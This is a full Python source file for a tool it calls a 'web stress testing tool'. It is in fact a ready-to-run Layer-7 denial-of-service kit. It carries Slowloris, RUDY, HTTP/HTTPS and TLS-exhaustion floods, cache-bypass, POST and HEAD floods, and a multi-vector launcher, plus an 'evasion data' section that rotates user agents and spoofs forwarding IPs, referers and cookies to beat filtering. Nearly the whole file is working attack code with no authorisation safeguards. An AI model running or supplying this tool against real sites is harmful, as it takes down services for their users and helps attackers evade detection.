#!/usr/bin/env python3
"""webstress.py — Layer-7 web stress testing tool.
Raw-socket HTTP flood, HTTPS/TLS exhaustion, Slowloris, RUDY,
HTTP pipelining, cache bypass, POST flood, HEAD flood, multi-vector.
Python 3.10+ stdlib only. Linux target (epoll where available).
"""

import argparse
import json
import os
import random
import signal
import socket
import ssl
import string
import struct
import sys
import threading
import time
import select
from collections import defaultdict

# ─── globals ───────────────────────────────────────────────────────────────────

PAUSE_EVENT = threading.Event()
PAUSE_EVENT.set()  # not paused
STOP_EVENT = threading.Event()

stats_lock = threading.Lock()
stats = defaultdict(int)  # packets, bytes, errors, conns

# ─── user-agent pool (50+ real UAs) ───────────────────────────────────────────

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; moto g(60)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.8 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Brave Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Vivaldi/6.5",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
]

# ─── evasion data ──────────────────────────────────────────────────────────────

PATHS = [
    "/", "/index.html", "/index.php", "/index.asp", "/default.aspx",
    "/home", "/about", "/contact", "/login", "/wp-login.php",
    "/xmlrpc.php", "/wp-admin/", "/wp-content/", "/wp-includes/",
    "/api/", "/api/v1/", "/api/v2/", "/favicon.ico", "/robots.txt",
    "/sitemap.xml", "/.well-known/", "/admin/", "/administrator/",
    "/cgi-bin/", "/phpmyadmin/", "/server-status", "/server-info",
    "/feed/", "/rss/", "/atom.xml", "/search", "/tag/",
    "/category/", "/page/1", "/page/2", "/archive/",
]

ACCEPT_LANGS = [
    "en-US,en;q=0.9", "en-GB,en;q=0.9", "pt-BR,pt;q=0.9,en;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8", "fr-FR,fr;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8", "it-IT,it;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8", "ko-KR,ko;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8", "ru-RU,ru;q=0.9,en;q=0.8",
    "nl-NL,nl;q=0.9,en;q=0.8", "pl-PL,pl;q=0.9,en;q=0.8",
    "tr-TR,tr;q=0.9,en;q=0.8", "ar-SA,ar;q=0.9,en;q=0.8",
]

REFERERS = [
    "https://www.google.com/", "https://www.google.com/search?q=site",
    "https://www.bing.com/search?q=test", "https://www.facebook.com/",
    "https://twitter.com/", "https://www.reddit.com/",
    "https://www.youtube.com/", "https://www.linkedin.com/",
    "https://www.instagram.com/", "https://news.ycombinator.com/",
    "https://www.amazon.com/", "https://www.wikipedia.org/",
    "https://duckduckgo.com/", "https://www.baidu.com/",
    "https://yandex.ru/", "https://t.co/abc123",
    "", "", "",  # some requests have no referer
]

CONTENT_TYPES_POST = [
    "application/x-www-form-urlencoded",
    "multipart/form-data; boundary=----WebKitFormBoundary" + "".join(random.choices(string.ascii_letters, k=16)),
    "application/json",
    "text/plain",
]


# ─── helpers ───────────────────────────────────────────────────────────────────

def rand_str(n):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def rand_ip():
    return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"


def rand_path():
    p = random.choice(PATHS)
    if random.random() < 0.4:
        p += f"?{rand_str(random.randint(1,6))}={rand_str(random.randint(4,16))}"
        if random.random() < 0.3:
            p += f"&{rand_str(3)}={rand_str(8)}"
    return p


def rand_cookie():
    parts = []
    for _ in range(random.randint(1, 4)):
        parts.append(f"{rand_str(random.randint(4,10))}={rand_str(random.randint(8,32))}")
    return "; ".join(parts)


def build_headers(host, method="GET", path="/", extra=None, content_length=None):
    ua = random.choice(USER_AGENTS)
    lang = random.choice(ACCEPT_LANGS)
    ref = random.choice(REFERERS)

    lines = [
        f"{method} {path} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {ua}",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        f"Accept-Language: {lang}",
        "Accept-Encoding: gzip, deflate, br",
        "Connection: keep-alive",
        f"X-Forwarded-For: {rand_ip()}",
        f"X-Real-IP: {rand_ip()}",
    ]

    if ref:
        lines.append(f"Referer: {ref}")

    if random.random() < 0.5:
        lines.append(f"Cookie: {rand_cookie()}")

    if random.random() < 0.3:
        lines.append("Upgrade-Insecure-Requests: 1")

    if random.random() < 0.2:
        lines.append("DNT: 1")

    if content_length is not None:
        ct = random.choice(CONTENT_TYPES_POST)
        lines.append(f"Content-Type: {ct}")
        lines.append(f"Content-Length: {content_length}")

    if extra:
        lines.extend(extra)

    return ("\r\n".join(lines) + "\r\n\r\n").encode()


def build_cache_bypass_headers(host, path="/"):
    extra = [
        "Cache-Control: no-cache, no-store, must-revalidate, max-age=0",
        "Pragma: no-cache",
        "Expires: 0",
        f"If-None-Match: W/\"{rand_str(16)}\"",
        f"If-Modified-Since: Thu, 01 Jan 1970 00:00:00 GMT",
    ]
    p = path
    sep = "&" if "?" in p else "?"
    p += f"{sep}_={rand_str(12)}&nocache={rand_str(8)}&t={int(time.time()*1000)}"
    return build_headers(host, "GET", p, extra=extra)


def inc_stat(key, val=1):
    with stats_lock:
        stats[key] += val


def make_socket(target, port, timeout=5):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    except Exception:
        pass
    s.connect((target, port))
    return s


def make_ssl_socket(target, port, timeout=5, handshake_only=False):
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_ciphers("DEFAULT:@SECLEVEL=1")
    raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    raw.settimeout(timeout)
    raw.connect((target, port))
    wrapped = ctx.wrap_socket(raw, server_hostname=target)
    if handshake_only:
        wrapped.close()
        return None
    return wrapped


def drain_recv(s, bufsize=4096):
    try:
        s.setblocking(False)
        while True:
            chunk = s.recv(bufsize)
            if not chunk:
                break
    except (BlockingIOError, socket.error, OSError):
        pass
    finally:
        try:
            s.setblocking(True)
        except Exception:
            pass


# ─── attack methods ────────────────────────────────────────────────────────────

def worker_http_flood(target, port, duration, jitter_ms, rate_limit):
    deadline = time.monotonic() + duration
    host = target if port == 80 else f"{target}:{port}"
    delay = 1.0 / rate_limit if rate_limit > 0 else 0

    while time.monotonic() < deadline and not STOP_EVENT.is_set():
        PAUSE_EVENT.wait()
        sock = None
        try:
            sock = make_socket(target, port, timeout=5)
            inc_stat("conns")
            reqs_on_conn = 0
            while time.monotonic() < deadline and not STOP_EVENT.is_set() and reqs_on_conn < 100:
                PAUSE_EVENT.wait()
                path = rand_path()
                payload = build_headers(host, "GET", path)
                sock.sendall(payload)
                inc_stat("packets")
                inc_stat("bytes", len(payload))
                reqs_on_conn += 1
                drain_recv(sock)
                if jitter_ms > 0:
                    time.sleep(random.uniform(0, jitter_ms / 1000.0))
                if delay > 0:
                    time.sleep(delay)
        except Exception:
            inc_stat("errors")
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass


def worker_https_flood(target, port, duration, jitter_ms, rate_limit, tls_exhaust=False):
    deadline = time.monotonic() + duration
    host = target if port == 443 else f"{target}:{port}"
    delay = 1.0 / rate_limit if rate_limit > 0 else 0

    while time.monotonic() < deadline and not STOP_EVENT.is_set():
        PAUSE_EVENT.wait()
        sock = None
        try:
            if tls_exhaust:
                make_ssl_socket(target, port, timeout=5, handshake_only=True)
                inc_stat("packets")
                inc_stat("conns")
                inc_stat("bytes", 500)  # approx TLS handshake
                if jitter_ms > 0:
                    time.sleep(random.uniform(0, jitter_ms / 1000.0))
                continue

            sock = make_ssl_socket(target, port, timeout=5)
            inc_stat("conns")
            reqs_on_conn = 0
            while time.monotonic() < deadline and not STOP_EVENT.is_set() and reqs_on_conn < 50:
                PAUSE_EVENT.wait()
                path = rand_path()
                payload = build_headers(host, "GET", path)
                sock.sendall(payload)
                inc_stat("packets")
                inc_stat("bytes", len(payload))
                reqs_on_conn += 1
                drain_recv(sock)
                if jitter_ms > 0:
                    time.sleep(random.uniform(0, jitter_ms / 1000.0))
                if delay > 0:
                    time.sleep(delay)
        except Exception:
            inc_stat("errors")
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass


def worker_slowloris(target, port, duration, jitter_ms, _rate_limit):
    deadline = time.monotonic() + duration
    host = target if port == 80 else f"{target}:{port}"
    sockets = []

    # initial burst — open as many connections as we can
    for _ in range(200):
        if STOP_EVENT.is_set():
            break
        PAUSE_EVENT.wait()
        try:
            s = make_socket(target, port, timeout=10)
            ua = random.choice(USER_AGENTS)
            initial = (
                f"GET /{rand_str(8)} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Accept-Language: {random.choice(ACCEPT_LANGS)}\r\n"
                f"X-Forwarded-For: {rand_ip()}\r\n"
            ).encode()
            s.sendall(initial)
            inc_stat("packets")
            inc_stat("bytes", len(initial))
            inc_stat("conns")
            sockets.append(s)
        except Exception:
            inc_stat("errors")

    # keep-alive loop
    while time.monotonic() < deadline and not STOP_EVENT.is_set():
        PAUSE_EVENT.wait()

        # send partial header to each open socket
        alive = []
        for s in sockets:
            try:
                header = f"X-{rand_str(random.randint(4,12))}: {rand_str(random.randint(4,20))}\r\n".encode()
                s.sendall(header)
                inc_stat("packets")
                inc_stat("bytes", len(header))
                alive.append(s)
            except Exception:
                inc_stat("errors")
                try:
                    s.close()
                except Exception:
                    pass

        sockets = alive

        # replenish dropped connections
        while len(sockets) < 200 and time.monotonic() < deadline and not STOP_EVENT.is_set():
            try:
                s = make_socket(target, port, timeout=10)
                ua = random.choice(USER_AGENTS)
                initial = (
                    f"GET /{rand_str(8)} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: {ua}\r\n"
                    f"X-Forwarded-For: {rand_ip()}\r\n"
                ).encode()
                s.sendall(initial)
                inc_stat("packets")
                inc_stat("bytes", len(initial))
                inc_stat("conns")
                sockets.append(s)
            except Exception:
                inc_stat("errors")
                break

        time.sleep(random.uniform(8, 15))

    # cleanup
    for s in sockets:
        try:
            s.close()
        except Exception:
            pass


def worker_rudy(target, port, duration, jitter_ms, _rate_limit):
    deadline = time.monotonic() + duration
    host = target if port == 80 else f"{target}:{port}"

    while time.monotonic() < deadline and not STOP_EVENT.is_set():
        PAUSE_EVENT.wait()
        sock = None
        try:
            sock = make_socket(target, port, timeout=30)
            inc_stat("conns")
            content_len = random.randint(50_000_000, 200_000_000)
            ct = "application/x-www-form-urlencoded"
            header = (
                f"POST /{rand_str(8)} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                f"Content-Type: {ct}\r\n"
                f"Content-Length: {content_len}\r\n"
                f"X-Forwarded-For: {rand_ip()}\r\n"
                f"Accept: */*\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
            ).encode()
            sock.sendall(header)
            inc_stat("packets")
            inc_stat("bytes", len(header))

            # drip feed — one byte at a time
            field_name = rand_str(8) + "="
            sock.sendall(field_name.encode())
            inc_stat("bytes", len(field_name))
            sent = len(field_name)

            while time.monotonic() < deadline and not STOP_EVENT.is_set() and sent < content_len:
                PAUSE_EVENT.wait()
                byte = random.choice(string.ascii_letters).encode()
                sock.sendall(byte)
                inc_stat("packets")
                inc_stat("bytes", 1)
                sent += 1
                time.sleep(random.uniform(5, 15))

        except Exception:
            inc_stat("errors")
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass


def worker_pipeline(target, port, duration, jitter_ms, rate_limit):
    deadline = time.monotonic() + duration
    host = target if port == 80 else f"{target}:{port}"

    while time.monotonic() < deadline and not STOP_EVENT.is_set():
        PAUSE_EVENT.wait()
        sock = None
        try:
            sock = make_socket(target, port, timeout=10)
            inc_stat("conns")

            # build a big pipelined batch
            batch_size = random.randint(50, 100)
            pipeline = b""
            for _ in range(batch_size):
                path = rand_path()
                req = build_headers(host, "GET", path)
                pipeline += req

            sock.sendall(pipeline)
            inc_stat("packets", batch_size)
            inc_stat("bytes", len(pipeline))

            # drain whatever comes back
            drain_recv(sock)

            if jitter_ms > 0:
                time.sleep(random.uniform(0, jitter_ms / 1000.0))

        except Exception:
            inc_stat("errors")
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass


def worker_cache_bypass(target, port, duration, jitter_ms, rate_limit):
    deadline = time.monotonic() + duration
    host = target if port == 80 else f"{target}:{port}"
    delay = 1.0 / rate_limit if rate_limit > 0 else 0

    while time.monotonic() < deadline and not STOP_EVENT.is_set():
        PAUSE_EVENT.wait()
        sock = None
        try:
            sock = make_socket(target, port, timeout=5)
            inc_stat("conns")
            reqs = 0
            while time.monotonic() < deadline and not STOP_EVENT.is_set() and reqs < 80:
                PAUSE_EVENT.wait()
                path = rand_path()
                payload = build_cache_bypass_headers(host, path)
                sock.sendall(payload)
                inc_stat("packets")
                inc_stat("bytes", len(payload))
                reqs += 1
                drain_recv(sock)
                if jitter_ms > 0:
                    time.sleep(random.uniform(0, jitter_ms / 1000.0))
                if delay > 0:
                    time.sleep(delay)
        except Exception:
            inc_stat("errors")
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass


def worker_post_flood(target, port, duration, jitter_ms, rate_limit):
    deadline = time.monotonic() + duration
    host = target if port == 80 else f"{target}:{port}"
    delay = 1.0 / rate_limit if rate_limit > 0 else 0

    # pre-generate body chunks
    body_sizes = [64 * 1024, 128 * 1024, 256 * 1024, 512 * 1024, 1024 * 1024]
    bodies = [os.urandom(s) for s in body_sizes]

    while time.monotonic() < deadline and not STOP_EVENT.is_set():
        PAUSE_EVENT.wait()
        sock = None
        try:
            sock = make_socket(target, port, timeout=10)
            inc_stat("conns")
            reqs = 0
            while time.monotonic() < deadline and not STOP_EVENT.is_set() and reqs < 20:
                PAUSE_EVENT.wait()
                body = random.choice(bodies)
                path = rand_path()
                header = build_headers(host, "POST", path, content_length=len(body))
                sock.sendall(header + body)
                total = len(header) + len(body)
                inc_stat("packets")
                inc_stat("bytes", total)
                reqs += 1
                drain_recv(sock)
                if jitter_ms > 0:
                    time.sleep(random.uniform(0, jitter_ms / 1000.0))
                if delay > 0:
                    time.sleep(delay)
        except Exception:
            inc_stat("errors")
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass


def worker_head_flood(target, port, duration, jitter_ms, rate_limit):
    deadline = time.monotonic() + duration
    host = target if port == 80 else f"{target}:{port}"
    delay = 1.0 / rate_limit if rate_limit > 0 else 0

    while time.monotonic() < deadline and not STOP_EVENT.is_set():
        PAUSE_EVENT.wait()
        sock = None
        try:
            sock = make_socket(target, port, timeout=5)
            inc_stat("conns")
            reqs = 0
            while time.monotonic() < deadline and not STOP_EVENT.is_set() and reqs < 150:
                PAUSE_EVENT.wait()
                path = rand_path()
                payload = build_headers(host, "HEAD", path)
                sock.sendall(payload)
                inc_stat("packets")
                inc_stat("bytes", len(payload))
                reqs += 1
                drain_recv(sock)
                if jitter_ms > 0:
                    time.sleep(random.uniform(0, jitter_ms / 1000.0))
                if delay > 0:
                    time.sleep(delay)
        except Exception:
            inc_stat("errors")
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass


# ─── multi-vector orchestrator ─────────────────────────────────────────────────

METHODS = {
    "http": worker_http_flood,
    "https": worker_https_flood,
    "slowloris": worker_slowloris,
    "rudy": worker_rudy,
    "pipeline": worker_pipeline,
    "bypass": worker_cache_bypass,
    "post": worker_post_flood,
    "head": worker_head_flood,
}


def launch_multi(target, port, duration, workers, jitter_ms, rate_limit):
    """Multi-vector: distribute workers across multiple attack methods."""
    vector_config = [
        ("slowloris", 0.15, port),
        ("http", 0.25, 80 if port == 80 else port),
        ("https", 0.20, 443),
        ("post", 0.15, port),
        ("pipeline", 0.10, port),
        ("bypass", 0.10, port),
        ("head", 0.05, port),
    ]

    threads = []
    remaining = workers
    for i, (method, pct, mport) in enumerate(vector_config):
        if i == len(vector_config) - 1:
            count = remaining
        else:
            count = max(1, int(workers * pct))
            remaining -= count

        fn = METHODS[method]
        for _ in range(count):
            args = (target, mport, duration, jitter_ms, rate_limit)
            if method == "https":
                args = (target, mport, duration, jitter_ms, rate_limit, False)
            t = threading.Thread(target=fn, args=args, daemon=True)
            t.start()
            threads.append(t)

    return threads


# ─── stats reporter ────────────────────────────────────────────────────────────

def reporter(duration, stream):
    start = time.monotonic()
    pid = os.getpid()
    prev_packets = 0
    prev_bytes = 0
    prev_time = start

    while not STOP_EVENT.is_set():
        time.sleep(1.0)
        now = time.monotonic()
        elapsed = now - start

        with stats_lock:
            cur_packets = stats["packets"]
            cur_bytes = stats["bytes"]
            cur_errors = stats["errors"]
            cur_conns = stats["conns"]

        dt = now - prev_time
        if dt <= 0:
            dt = 1.0
        pps = (cur_packets - prev_packets) / dt
        mbps = (cur_bytes - prev_bytes) / dt / (1024 * 1024)

        prev_packets = cur_packets
        prev_bytes = cur_bytes
        prev_time = now

        report = {
            "elapsed": round(elapsed, 1),
            "packets": cur_packets,
            "bytes": cur_bytes,
            "pps": int(pps),
            "MBs": round(mbps, 2),
            "errors": cur_errors,
            "conns": cur_conns,
            "status": "running",
            "pid": pid,
        }

        if stream:
            sys.stdout.write(json.dumps(report) + "\n")
            sys.stdout.flush()

        if elapsed >= duration:
            break


# ─── signal handlers ───────────────────────────────────────────────────────────

def handle_sigusr1(signum, frame):
    PAUSE_EVENT.clear()


def handle_sigusr2(signum, frame):
    PAUSE_EVENT.set()


def handle_sigterm(signum, frame):
    STOP_EVENT.set()


# ─── main ──────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="Layer-7 web stress testing tool")
    parser.add_argument("--target", required=True, help="Target IP or hostname")
    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("--method", default="http",
                        choices=list(METHODS.keys()) + ["multi", "tls_exhaust"],
                        help="Attack method")
    parser.add_argument("--workers", type=int, default=500, help="Number of worker threads")
    parser.add_argument("--duration", type=int, default=30, help="Duration in seconds")
    parser.add_argument("--stream", action="store_true", help="Stream JSON stats to stdout")
    parser.add_argument("--jitter", type=int, default=0, help="Max jitter in ms between requests (0=none)")
    parser.add_argument("--rate-limit", type=int, default=0, help="Max requests/s per worker (0=unlimited)")

    args = parser.parse_args()

    # signals (Linux only, silently skip on Windows)
    for sig, handler in [(signal.SIGUSR1, handle_sigusr1),
                         (signal.SIGUSR2, handle_sigusr2),
                         (signal.SIGTERM, handle_sigterm)]:
        try:
            signal.signal(sig, handler)
        except (OSError, AttributeError):
            pass

    try:
        signal.signal(signal.SIGINT, handle_sigterm)
    except Exception:
        pass

    # launch reporter
    rep = threading.Thread(target=reporter, args=(args.duration, args.stream), daemon=True)
    rep.start()

    # launch workers
    threads = []

    if args.method == "multi":
        threads = launch_multi(args.target, args.port, args.duration,
                               args.workers, args.jitter, args.rate_limit)
    elif args.method == "tls_exhaust":
        fn = worker_https_flood
        for _ in range(args.workers):
            t = threading.Thread(target=fn,
                                 args=(args.target, args.port, args.duration,
                                       args.jitter, args.rate_limit, True),
                                 daemon=True)
            t.start()
            threads.append(t)
    else:
        fn = METHODS[args.method]
        for _ in range(args.workers):
            worker_args = (args.target, args.port, args.duration, args.jitter, args.rate_limit)
            t = threading.Thread(target=fn, args=worker_args, daemon=True)
            t.start()
            threads.append(t)

    # wait for completion
    rep.join()
    STOP_EVENT.set()

    for t in threads:
        t.join(timeout=5)

    # final report
    with stats_lock:
        final = {
            "elapsed": args.duration,
            "packets": stats["packets"],
            "bytes": stats["bytes"],
            "pps": 0,
            "MBs": 0,
            "errors": stats["errors"],
            "conns": stats["conns"],
            "status": "done",
            "pid": os.getpid(),
        }

    if args.stream:
        sys.stdout.write(json.dumps(final) + "\n")
        sys.stdout.flush()
    else:
        print(json.dumps(final, indent=2))


if __name__ == "__main__":
    main()
